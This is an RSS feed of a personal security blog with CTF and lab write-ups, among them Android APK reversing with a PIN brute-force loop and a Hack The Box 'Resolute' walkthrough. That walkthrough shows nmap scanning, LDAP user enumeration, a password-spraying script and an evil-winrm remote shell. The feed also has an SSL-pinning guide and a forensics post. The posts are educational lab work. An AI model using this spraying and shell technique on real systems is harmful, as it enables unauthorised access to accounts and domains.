<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[Inês Martins]]></title><description><![CDATA[Dev & Security]]></description><link>https://inesmartins.github.io/</link><image><url>https://inesmartins.github.io/favicon.png</url><title>Inês Martins</title><link>https://inesmartins.github.io/</link></image><generator>Ghost 3.18</generator><lastBuildDate>Sat, 13 Jun 2020 21:37:12 GMT</lastBuildDate><atom:link href="https://inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev]]></title><description><![CDATA[<p><em>The APK for the original challenge can be downloaded <a href="http://sefod.eu/ctf/xmas_ctfzadas.apk">here</a>.</em><br><em>The author's write-up can be downloaded <a href="https://github.com/zezadas/0xOPOSEC_0x73_VulnApp_Android/blob/master/Low%20Hanging%20Fruit%20On%20Android.pdf">here</a>.</em></p><p>We're given an Android Package (<code>xmas_ctfzadas.apk</code>) along with the following instructions:</p><!--kg-card-begin: markdown--><pre><code>Baby pwn tu-tu-tu-tu!
- Get the first two flags ({oposec}XPTO) locally;
- For the brave ones, find a way</code></pre>]]></description><link>https://inesmartins.github.io/oposec-baby-xmas-challenge-android-rev/</link><guid isPermaLink="false">5ee51aa03d00be7291b53f47</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 13 Jun 2020 21:33:38 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/highres_471963990-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/highres_471963990-1-1.jpeg" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"><p><em>The APK for the original challenge can be downloaded <a href="http://sefod.eu/ctf/xmas_ctfzadas.apk">here</a>.</em><br><em>The author's write-up can be downloaded <a href="https://github.com/zezadas/0xOPOSEC_0x73_VulnApp_Android/blob/master/Low%20Hanging%20Fruit%20On%20Android.pdf">here</a>.</em></p><p>We're given an Android Package (<code>xmas_ctfzadas.apk</code>) along with the following instructions:</p><!--kg-card-begin: markdown--><pre><code>Baby pwn tu-tu-tu-tu!
- Get the first two flags ({oposec}XPTO) locally;
- For the brave ones, find a way to get the third flag
- Yup &quot;This_is_the_flag&quot; is your friend but not the final solution.
</code></pre>
<!--kg-card-end: markdown--><h2 id="unzipping-the-apk">Unzipping the APK</h2><p>An APK is actually a ZIP file, by unzipping it we get to see the compressed files:</p><!--kg-card-begin: markdown--><pre><code>~ unzip app.apk

~ ls -la
...
-rw-r--r--@  1 inesmartins  staff     2444 Nov 22  2019 AndroidManifest.xml
drwxr-xr-x@  5 inesmartins  staff      160 Jun 13 20:59 META-INF
-rw-r--r--@  1 inesmartins  staff   178784 Nov 22  2019 classes.dex
-rw-r--r--@  1 inesmartins  staff  2062612 Nov 22  2019 classes2.dex
drwxr-xr-x@  3 inesmartins  staff       96 Jun 13 20:59 lib
drwxr-xr-x@ 16 inesmartins  staff      512 Jun 13 20:59 res
-rw-r--r--@  1 inesmartins  staff   225072 Nov 22  2019 resources.arsc
</code></pre>
<!--kg-card-end: markdown--><p>So, as expected we see <code>AndroidManifest.xml</code>, some .dex files (the source code), the resources, and also one <a href="https://en.wikipedia.org/wiki/Java_Native_Interface">Java Native Interface</a> (JNI) library that contains some interesting information:</p><!--kg-card-begin: markdown--><pre><code>~ strings lib/armeabi-v7a/libopoctf-jni.so

...
Java_pt_oposec_ctfzadas_CTFObject_firstFlag
Java_pt_oposec_ctfzadas_CTFObject_secondFlag
Java_pt_oposec_ctfzadas_CTFObject_thirdFlag
Java_pt_oposec_ctfzadas_MainActivity_stringFromJNI
envzadas
jump_here
jump_not_here
...
tres_out
...
This_is_not_the_flag
This_is_the_flag
...
</code></pre>
<!--kg-card-end: markdown--><h2 id="static-analysis-with-jd-gui">Static analysis with JD-GUI</h2><p>We start by transforming the .dex files into a single .jar file using the <a href="https://sourceforge.net/projects/dex2jar/files/">dex2jar</a> script:</p><!--kg-card-begin: markdown--><pre><code>~ sh dex2jar-2.0/d2j-dex2jar.sh -f xmas_ctfzadas.apk
</code></pre>
<!--kg-card-end: markdown--><p>To go through the .jar we use <a href="http://java-decompiler.github.io/">JD-GUI</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/files-1.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><p>The <code>pt.oposec.ctfzadas</code> package contains 4 classes:</p><ul><li><code>BuildConfig.class</code> and <code>R.class</code> are both automatically generated files: the first lists the project configs and the second identifies all the project assets;</li><li>this leaves only 2 interesting files: <code>MainActivity.class</code> and <code>CTFObject.class</code>.</li></ul><h3 id="mainactivity-class">MainActivity.class</h3><p>From the manifest we know that the application has only 1 <a href="https://developer.android.com/reference/android/content/Intent">Intent</a>, which launches the MainActivity.</p><p>As we can see below, on app start the MainActivity loads the <code>opoctf-jni</code> library, then creates a <a href="https://developer.android.com/reference/android/webkit/WebView">Webview</a> that has access to an instance of the <code>CTFObject</code> class called <code>ctfObj</code>. The webview's URL depends on the Intent's <code>open_sesame</code> query string.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/main-2.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><h3 id="ctfobject-class">CTFObject.class</h3><p>This class is quite interesting:</p><ol><li>There is a function called <code>um</code> that returns the output of the <code>firstFlag</code> JNI function:</li></ol><pre><code class="language-java">public class CTFObject {
...
	
    public native String firstFlag();
    
    @JavascriptInterface
    public String um() {
        return firstFlag();
    }

...
}
</code></pre><p>2. Similarly, there's a function called <code>dois</code> that calls the <code>secondFlag</code> JNI function with a string param. Note that there's a 5-number PIN mentioned on this function.</p><pre><code class="language-java">public class CTFObject {
...

    public native String secondFlag(String paramString);

    @JavascriptInterface
    public String dois(String paramString) {
        Log.d("OPOSEC", "Pin have 5 numbers (String)\nString starts with \"{oposec}\"");
        Log.d(secondFlag(paramString), secondFlag(paramString));
        return secondFlag(paramString);
    }

...
}
</code></pre><p>3. Finally, there's a <code>tres</code> function that calls the <code>thirdFlag</code> function from the JNI library with a byte array that's parsed from a hex string:</p><pre><code class="language-java">public class CTFObject {
...

    public static byte[] hexStringToByteArray(String paramString) {
        int j = paramString.length();
        byte[] arrayOfByte = new byte[j / 2 + 1];
        for (int i = 0; i &lt; j; i += 2)
            arrayOfByte[i / 2] = (byte)((Character.digit(paramString.charAt(i), 16) &lt;&lt; 4) + Character.digit(paramString.charAt(i + 1), 16));
            arrayOfByte[arrayOfByte.length - 1] = Integer.valueOf(0).byteValue();
        return arrayOfByte;
    }
  
    public native String thirdFlag(byte[] paramArrayOfbyte);
    
    @JavascriptInterface
    public String tres(String paramString) {
        Log.d("aaa-", paramString);
        byte[] arrayOfByte = hexStringToByteArray(paramString);
        Log.d("aaa:", String.valueOf(arrayOfByte));
        return thirdFlag(arrayOfByte);
    }

...
}
</code></pre><p>Note that functions <code>um</code>, <code>dois</code> and <code>tres</code> are accessible on the MainActivity's webview since they're marked with the <a href="https://developer.android.com/reference/android/webkit/JavascriptInterface">JavascriptInterface notation</a>.</p><h2 id="re-creating-the-android-project">Re-Creating the Android project</h2><p>After installing <a href="https://developer.android.com/studio/?gclid=CjwKCAjw8pH3BRAXEiwA1pvMsX1EY3uC8enHJFsoQM2iuA4gUypWFvBJ7tUuhjy1dcuRjtUnVzUa3RoCvdcQAvD_BwE&amp;gclsrc=aw.ds">Android Studio</a> we create a new Android project and then:</p><ul><li>add the <code>CTFObject</code> class to <code>src/main/java/pt.oposec.ctfzadas</code> - I ended up changing the Java code to Kotlin, since I'm more familiar with it.</li><li>add the <code>libopoctf-jni.so</code> library under <code>/src/main/jniLibs/armeabi-v7a</code> (this path is extremely important).</li></ul><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/dir.png" class="kg-image" alt="ØxOPOSɆC Baby Xmas Challenge 2019 | Android Rev"></figure><h2 id="getting-the-first-flag">Getting the first flag</h2><p>The first flag is very simple, all we need is an instance of <code>CTFObject</code> and then we can simply print the result of calling either <code>um</code> or the <code>firstFlag</code> function directly, as shown below.</p><pre><code class="language-kotlin">package pt.oposec.ctfzadas

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private var ctfObject = CTFObject()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        print(ctfObject.firstFlag())
    }
}
</code></pre><h2 id="getting-the-second-flag">Getting the second flag</h2><p>From the <code>CTFObject</code> class we know we need to find a 5-digit PIN code, which we can easily brute force. Knowing that the flag has the word <code>oposec</code> we simply run through all the options until we get the one that prints out the flag:</p><pre><code class="language-kotlin">package pt.oposec.ctfzadas

import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    
    private var ctfObject = CTFObject()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        for (i in 0..9) {
            for (j in 0..9) {
                for (k in 0..9) {
                    for (l in 0..9) {
                        for (m in 0..9) {
                            val pin = "$i$j$k$l$m"
                            val res = ctfObject.secondFlag(pin)
                            if (res.contains("oposec")) {
                                print(pin)
                            }
                        }
                    }
                }
            }
        }
        print("Could not get flag")   
    }
    ```</code></pre><h2 id="getting-the-third-flag">Getting the third flag</h2><p>To Be Continued</p><p></p>]]></content:encoded></item><item><title><![CDATA[Simplest way to host your Ghost blog on GitHub Pages]]></title><description><![CDATA[<p>This tutorial assumes you already have a Ghost blog that you want to host on Github Pages. </p><ol><li>Follow <a href="https://pages.github.com/">these instructions</a> to create a repository for your Github Pages blog, and then clone the repo somewhere on your computer;</li><li>Go to the directory where you have your Ghost blog, run <code>ghost</code></li></ol>]]></description><link>https://inesmartins.github.io/simplest-way-to-host-your-ghost-site-on-gitpages/</link><guid isPermaLink="false">5ede3138b6ef324dc7275d08</guid><category><![CDATA[ghost]]></category><category><![CDATA[blog]]></category><category><![CDATA[static site generator]]></category><category><![CDATA[gssg]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 08 Jun 2020 12:54:15 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/ghost-uma-otima-alternativa-para-blogs-profissionais-e-pessoais.jpg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/ghost-uma-otima-alternativa-para-blogs-profissionais-e-pessoais.jpg" alt="Simplest way to host your Ghost blog on GitHub Pages"><p>This tutorial assumes you already have a Ghost blog that you want to host on Github Pages. </p><ol><li>Follow <a href="https://pages.github.com/">these instructions</a> to create a repository for your Github Pages blog, and then clone the repo somewhere on your computer;</li><li>Go to the directory where you have your Ghost blog, run <code>ghost start</code> and take note of the local port;</li><li>Install <a href="https://www.npmjs.com/package/ghost-static-site-generator">ghost-static-site-generator</a>;</li><li>If your blog is running on the default port (2368), you can simply run from your Ghost blog's directory:</li></ol><pre><code>gssg --url [your-github-pages-URL]</code></pre><p>if you're running from some other port you can specify it with the <code>domain</code> parameter:</p><pre><code>gssg --url [your-github-pages-URL] --domain http://localhost:4444 </code></pre><p>5. If everything went smoothly you now have a directory called static inside your Ghost blog's directory. You can check if everything went well by running:</p><pre><code>gssg preview</code></pre><p>6. Copy all of the contents of the static dir to the Github Pages repo, commit + push these new files and you're done!</p><p>Note that instead of copying the files, you can set the Github Pages repo as the destination directory as such:</p><pre><code>gssg --url [your-github-pages-URL] --dest your-github-pages-repo</code></pre>]]></content:encoded></item><item><title><![CDATA[SSL Pinning on Android]]></title><description><![CDATA[<p><em>Banner source: <a href="https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1">https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1</a></em></p><p>Typically, when an Android application wants to establish a trusted connection with a remote host, it checks whether the certificate's "chain of trust" is valid and compatible with the root CAs (Certificate Authorities) that are pre-installed in the device (Settings &gt;</p>]]></description><link>https://inesmartins.github.io/ssl-pinning-on-android/</link><guid isPermaLink="false">5ede2cbdb6ef324dc7275cc2</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 08 Jun 2020 12:26:32 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/mitm.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/mitm.png" alt="SSL Pinning on Android"><p><em>Banner source: <a href="https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1">https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1</a></em></p><p>Typically, when an Android application wants to establish a trusted connection with a remote host, it checks whether the certificate's "chain of trust" is valid and compatible with the root CAs (Certificate Authorities) that are pre-installed in the device (Settings &gt; Security &gt; Trusted Credentials). </p><p>However, this hierarchy can and <em>is</em> sometimes compromised, i.e.: malicious actors are sometimes able to generate fake certificates, which allow them to intercept encrypted communications.</p><p>SSL Pinning is a mechanism that ensures that one or more public keys or certificates that the client knows to be trustworthy are part of the chain of the host's certificate.</p><h3 id="is-ssl-pinning-100-safe">Is SSL Pinning 100% safe?</h3><p>SSL Pinning can be circumvented <u>if the Android device is rooted</u>. See:</p><ul><li><a href="https://medium.com/@felipecsl/bypassing-certificate-pinning-on-android-for-fun-and-profit-1b0d14beab2b">Bypassing Certificate Pinning on Android for fun and profit</a></li><li><a href=" https://spenkk.github.io/bugbounty/Configuring-Frida-with-Burp-and-GenyMotion-to-bypass-SSL-Pinning/">Configuring Frida with BurpSuite and Genymotion to bypass Android SSL Pinning</a></li></ul><h3 id="certificate-pinning-vs-key-pinning">Certificate Pinning vs Key Pinning</h3><p>It's possible to pin multiple certificates from the host's certificate's chain. The application will establish the connection with the server as long as at least one of them is valid. However:</p><ul><li>Pinning only the "leaf" certificates means the application will stop working every time the server updates its certificates, unless backup certificates are configured, which is recommended. This may or may not be a problem, depending on how often these certificates are updated (typically this update occurs every 1 or 2 years).</li><li>Pinning intermediate certificates means trusting that the intermediate CAs won't generate malicious certificates for the server. However, if the "leaves" change, the app will continue to work.</li></ul><p>One very simple way to prevent the app from having to be updated every time its "leaves" are updated, is to <u>pin the certificate's public key</u> instead of the certificates themselves.</p><p>Unless the CA requires a new certificate request, updating a certificate doesn't change its public key and, as such, it's possible to use this key for a lot longer. </p><p>This solution also prevents the application from trusting any 3rd party, such as intermediate CAs.</p><h3 id="public-key-pinning-using-okhttp">Public Key Pinning using OkHttp</h3><p><a href="https://square.github.io/okhttp/">OkHttp</a> is one of the most commonly used libraries to manage network requests in Android. Parameterising this library to use SSL pining, and more specifically, public key pinning is very simple:</p><ol><li>Build an instance of <a href="https://square.github.io/okhttp/3.x/okhttp/okhttp3/CertificatePinner.html">CertificatePinner</a> that contains all the public keys and corresponding hostnames you want to pin: </li></ol><pre><code class="language-kotlin">val pinner = CertificatePinner
	.Builder()
    .add(CERT_HOSTNAME_1, CERT_PUBLIC_KEY_1)
    .add(CERT_HOSTNAME_2, CERT_PUBLIC_KEY_2)
    .add(CERT_HOSTNAME_N, CERT_PUBLIC_KEY_N)
	.build()</code></pre><p>2. Pass this object as a param of the <a href="https://square.github.io/okhttp/3.x/okhttp/okhttp3/OkHttpClient.Builder.html">OkHttpClient builder</a>:</p><pre><code class="language-kotlin">val okhttpClient = OkHttpClient
	.Builder()
    .certificatePinner(pinner)
    .build()</code></pre><h3 id="sources"><strong>Sources</strong></h3><ul><li><a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning</a></li><li><a href="https://medium.com/@appmattus/android-security-ssl-pinning-1db8acb6621e">https://medium.com/@appmattus/android-security-ssl-pinning-1db8acb6621e</a></li><li><a href="https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1">https://dzone.com/refcardz/securing-mobile-applications-with-cert-pinning?chapter=1</a></li><li><a href="https://www.netguru.com/codestories/3-ways-how-to-implement-certificate-pinning-on-android">https://www.netguru.com/codestories/3-ways-how-to-implement-certificate-pinning-on-android</a></li><li><a href="https://www.raywenderlich.com/5634-securing-network-data-tutorial-for-android">https://www.raywenderlich.com/5634-securing-network-data-tutorial-for-android</a></li><li><a href="https://medium.com/@enriqueramrezmanzaneda/managing-api-keys-in-android-builds-ddf56bb3b5a5">https://medium.com/@enriqueramrezmanzaneda/managing-api-keys-in-android-builds-ddf56bb3b5a5</a></li></ul>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Resolute]]></title><description><![CDATA[<p><em>The retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/220">here</a>.<br>Official write-up can be downloaded <a href="https://www.hackthebox.eu/home/machines/writeup/220">here</a>.</em></p><p>I started with some basic scanning with nmap that found that most likely this machine was a Domain Controller, since it had all the <a href="http://techgenix.com/domain-controllers-required-ports/">required ports</a> open. </p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV 10.10.10.169 -Pn

53/tcp</code></pre>]]></description><link>https://inesmartins.github.io/htb-walkthrough-resolute-user/</link><guid isPermaLink="false">5ede1edc75d86d3b22fddbe0</guid><category><![CDATA[windows]]></category><category><![CDATA[htb]]></category><category><![CDATA[ad]]></category><category><![CDATA[windapsearch]]></category><category><![CDATA[domain controller]]></category><category><![CDATA[windows domain]]></category><category><![CDATA[evil-winrm]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Mon, 08 Jun 2020 11:58:35 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/resolute.png" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/resolute.png" alt="HTB Write-up | Resolute"><p><em>The retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/220">here</a>.<br>Official write-up can be downloaded <a href="https://www.hackthebox.eu/home/machines/writeup/220">here</a>.</em></p><p>I started with some basic scanning with nmap that found that most likely this machine was a Domain Controller, since it had all the <a href="http://techgenix.com/domain-controllers-required-ports/">required ports</a> open. </p><!--kg-card-begin: markdown--><pre><code>$ nmap -sC -sV 10.10.10.169 -Pn

53/tcp open domain?
| fingerprint-strings:
    | DNSVersionBindReqTCP:
        | version
        |_ bind
88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-21 22:13:06Z)
135/tcp open msrpc Microsoft Windows RPC
139/tcp open netbios-ssn Microsoft Windows netbios-ssn
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp open kpasswd5?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
636/tcp open tcpwrapped
3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open tcpwrapped
5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open mc-nmf .NET Message Framing
47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open msrpc Microsoft Windows RPC
49665/tcp open msrpc Microsoft Windows RPC
49666/tcp open msrpc Microsoft Windows RPC
49667/tcp open msrpc Microsoft Windows RPC
49671/tcp open msrpc Microsoft Windows RPC
49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open msrpc Microsoft Windows RPC
49688/tcp open msrpc Microsoft Windows RPC
49860/tcp open tcpwrapped
49907/tcp open msrpc Microsoft Windows RPC
1 service unrecognized despite returning data.
If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

SF-Port53-TCP:
     V=7.80%
     I=7%
     D=12/21%
     Time=5DFE9733%
     P=x86_64-apple-darwin17.7.0
     SF:%r(DNSVersionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07v
     SF:ersion\x04bind\0\0\x10\0\x03&quot;);

Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 2h47m28s, deviation: 4h37m09s, median: 7m27s
| smb-os-discovery:
     | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
     | Computer name: Resolute
     | NetBIOS computer name: RESOLUTE\x00
     | Domain name: megabank.local
     | Forest name: megabank.local
     | FQDN: Resolute.megabank.local
     |_ System time: 2019-12-21T14:13:46-08:00
| smb-security-mode:
     | account_used: &lt;blank&gt;
     | authentication_level: user
     | challenge_response: supported
     |_ message_signing: required
| smb2-security-mode:
     | 2.02:
     |_ Message signing enabled and required
| smb2-time:
     | date: 2019-12-21T22:13:45
     |_ start_date: 2019-12-21T21:06:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 206.55 seconds
</code></pre>
<!--kg-card-end: markdown--><p>This enumeration also revealed that the machine's name is Resolute and the Domain/Forest name is megabank.local.</p><p>Since we think this machine is a Domain Controller, we try to enumerate the users in the Domain using the <a href="https://github.com/ropnop/windapsearch">windapsearch.py</a> script.</p><blockquote><code>windapsearch</code> is a Python script to help enumerate users, groups and computers from a Windows domain through LDAP queries. By default, Windows Domain Controllers support basic LDAP operations through port 389/tcp. With any valid domain account (regardless of privileges), it is possible to perform LDAP queries against a domain controller for any AD related information.</blockquote><!--kg-card-begin: markdown--><pre><code>python2 ./windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --full --attrs 'badPwdCount,lastLogon' --users
</code></pre>
<!--kg-card-end: markdown--><p>This allowed us to find a list with details about all users including full name and description. Here, we came across something very interesting:</p><!--kg-card-begin: markdown--><pre><code>userPrincipalName: marko@megabank.local
displayName: Marko Novak
description: Account created. Password set to Welcome123!
</code></pre>
<!--kg-card-end: markdown--><p>So, we tried to use this password to authenticate marko using the same script:</p><!--kg-card-begin: markdown--><pre><code>python2 ./windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --user marko@megabank.local --password Welcome123!
</code></pre>
<!--kg-card-end: markdown--><p>Since this failed, we tried to use the same password to authenticate the other known users:</p><!--kg-card-begin: markdown--><pre><code>import os

names = [ 'ryan', 'marko', 'sunita', 'abigail', 'marcus', 'sally', 'fred', 'angela', 'felicia', 'gustavo', 'ulf', 'stevie', 'claire', 'paulo', 'steve', 'annette', 'annika', 'per', 'claude', 'melanie', 'zach', 'simon', 'naoki' ]

for name in names:
    full_usr = name + '@megabank.local'
    print('Trying password Welcome123! with user ' + full_usr)
    os.system('python2 windapsearch.py -d Resolute.megabank.local --dc-ip 10.10.10.169 --user ' + full_usr  + ' --password Welcome123!')
</code></pre>
<!--kg-card-end: markdown--><p>This succeeded for melanie:</p><!--kg-card-begin: markdown--><pre><code>Trying password Welcome123! with user melanie@megabank.local
[+] Using Domain Controller at: 10.10.10.169
[+] Getting defaultNamingContext from Root DSE
[+] Found: DC=megabank,DC=local
[+] Attempting bind
[+] ...success! Binded as:
[+] u:MEGABANK\melanie

[*] Bye!
</code></pre>
<!--kg-card-end: markdown--><p>As you can see, we're being booted out from the machine as soon as we authenticate, which we were able to surpass using <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a>:</p><!--kg-card-begin: markdown--><pre><code>$ ruby evil-winrm.rb -i 10.10.10.169 -u melanie@megabank.local -p 'Welcome123!'

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

Evil-WinRM* PS C:\Users\melanie\Desktop&gt; cat user.txt
</code></pre>
<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Steg Challenge 2019]]></title><description><![CDATA[<p>We're given <a href="https://www.dropbox.com/s/j56ojepwlo5hy31/An%C3%A1lise.eml?dl=0">an email</a> (in <a href="https://fileinfo.com/extension/eml">EML format</a>) with a banner and some text that is leading us to think that the email contains some sort of hidden data:</p><blockquote>Hi,<br>I need someone who's able to analyse a PC, could you help me?<br>PS: Let's use our usual way of exchanging</blockquote>]]></description><link>https://inesmartins.github.io/oxopos-c-steg-challenge/</link><guid isPermaLink="false">5edd7174989b5d0f390eb953</guid><category><![CDATA[steg]]></category><category><![CDATA[steganography]]></category><category><![CDATA[oposec]]></category><category><![CDATA[volatility]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 23:14:28 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/highres_471963990-1.jpeg" medium="image"/><content:encoded><![CDATA[<img src="https://inesmartins.github.io/content/images/2020/06/highres_471963990-1.jpeg" alt="ØxOPOSɆC Steg Challenge 2019"><p>We're given <a href="https://www.dropbox.com/s/j56ojepwlo5hy31/An%C3%A1lise.eml?dl=0">an email</a> (in <a href="https://fileinfo.com/extension/eml">EML format</a>) with a banner and some text that is leading us to think that the email contains some sort of hidden data:</p><blockquote>Hi,<br>I need someone who's able to analyse a PC, could you help me?<br>PS: Let's use our usual way of exchanging classified information!<br>--<br><strong>Volatility</strong> is the constant of life!</blockquote><p>And indeed, when we use an <a href="https://futureboy.us/stegano/decinput.html">online steg decoder</a> we can find a Dropbox link hidden in the image:</p><!--kg-card-begin: markdown--><pre><code>0c60fd56872251909cb07a749b03a34a56e1edac  memdmp.zip

https://www.dropbox.com/s/ks30qs78k18lfd0/memdmp.zip?dl=0
</code></pre>
<!--kg-card-end: markdown--><p>This zip file contains only one file - memdmp - which we're going to analyse with <a href="https://github.com/volatilityfoundation/volatility">Volatility</a> as suggested by the email:</p><!--kg-card-begin: markdown--><p><code>sudo apt-get install volatility</code></p>
<!--kg-card-end: markdown--><p>We start going through the various options looking for something that seems relevant, which we finally do once we see the word NOTEPAD on the clipboard.</p><!--kg-card-begin: markdown--><pre><code>~ volatility -f memdmp clipboard
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                 Handle Object     Data                                              
---------- ------------- ------------------ ---------- ---------- --------------------------------------------------
         0 WinSta0       CF_UNICODETEXT        0x30115 0xe146f0b8 NOTEPAD                                           
         0 WinSta0       CF_LOCALE            0x5400fb 0xe1b75620                                                   
         0 WinSta0       CF_TEXT                   0x1 ----------                                                   
         0 WinSta0       CF_OEMTEXT                0x1 ---------- 
         
         ```</code></pre>
<!--kg-card-end: markdown--><p>This leads us to search for useful data on Notepad:</p><!--kg-card-begin: markdown--><pre><code>~ volatility -f memdmp notepad
Volatility Foundation Volatility Framework 2.6
Process: 1864
Text:
NOTEPAD

Text:


https://bit.ly/31uALei



NOTEPAD

</code></pre>
<!--kg-card-end: markdown--><p>This link leads us to a <a href="https://www.dropbox.com/s/tsf768x9tvnurow/isso.txt?dl=0">file</a> that contains a simple ROT13 cipher, which we were able to decipher this text using <a href="https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)&amp;input=c3ludHtaOFolUUhaQyVFNVBYRiF9">CyberChef</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io/content/images/2020/06/flag.png" class="kg-image" alt="ØxOPOSɆC Steg Challenge 2019"></figure><hr><h3 id="useful-resources">Useful Resources</h3><ul><li><a href="https://cqureacademy.com/blog/forensics/memory-dump-analysis">https://cqureacademy.com/blog/forensics/memory-dump-analysis</a></li><li><a href="https://www.forwarddefense.com/pdfs/Memory-Analysis-with-Volatility.pdf">https://www.forwarddefense.com/pdfs/Memory-Analysis-with-Volatility.pdf</a></li><li><a href="https://www.andreafortuna.org/2017/07/10/volatility-my-own-cheatsheet-part-3-process-memory/">https://www.andreafortuna.org/2017/07/10/volatility-my-own-cheatsheet-part-3-process-memory/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[ØxOPOSɆC Crypto Challenge 2019]]></title><description><![CDATA[<h2 id="level-1">Level 1 </h2><p>This first level is an example of how the <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a> can be used against the AES-CTR algorithm, if incorrectly implemented.</p><p>We're given a ciphered text (C1):</p><!--kg-card-begin: markdown--><p><code>5/KIDoW4XvtTCLZQSQl9GYBmdSC+vj2wDxP4Bbg=</code></p>
<!--kg-card-end: markdown--><p>and its plaintext equivalent (P1):</p><!--kg-card-begin: markdown--><p><code>this data is indeed important</code></p>
<!--kg-card-end: markdown--><p>And we're asked to decipher a second cipher</p>]]></description><link>https://inesmartins.github.io/0xoposec/</link><guid isPermaLink="false">5edd699b989b5d0f390eb8ab</guid><category><![CDATA[cryptography]]></category><category><![CDATA[ctf]]></category><category><![CDATA[aes]]></category><category><![CDATA[aes-ctr]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 07 Jun 2020 22:48:24 GMT</pubDate><media:content url="https://inesmartins.github.io/content/images/2020/06/highres_471963990.jpeg" medium="image"/><content:encoded><![CDATA[<h2 id="level-1">Level 1 </h2><img src="https://inesmartins.github.io/content/images/2020/06/highres_471963990.jpeg" alt="ØxOPOSɆC Crypto Challenge 2019"><p>This first level is an example of how the <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack">known-plaintext attack</a> can be used against the AES-CTR algorithm, if incorrectly implemented.</p><p>We're given a ciphered text (C1):</p><!--kg-card-begin: markdown--><p><code>5/KIDoW4XvtTCLZQSQl9GYBmdSC+vj2wDxP4Bbg=</code></p>
<!--kg-card-end: markdown--><p>and its plaintext equivalent (P1):</p><!--kg-card-begin: markdown--><p><code>this data is indeed important</code></p>
